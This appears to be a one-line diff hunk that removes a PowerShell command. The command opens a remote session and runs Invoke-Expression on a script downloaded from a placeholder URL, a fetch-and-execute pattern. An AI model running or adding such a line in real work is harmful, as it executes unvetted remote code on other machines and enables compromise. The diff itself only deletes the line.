@@ -1,1 +1,0 @@
-$session = New-PSSession -ComputerName 'remote-server'; Invoke-Command -Session $session -ScriptBlock { iex (iwr 'http://example.com/script.ps1' -UseBasicParsing) }
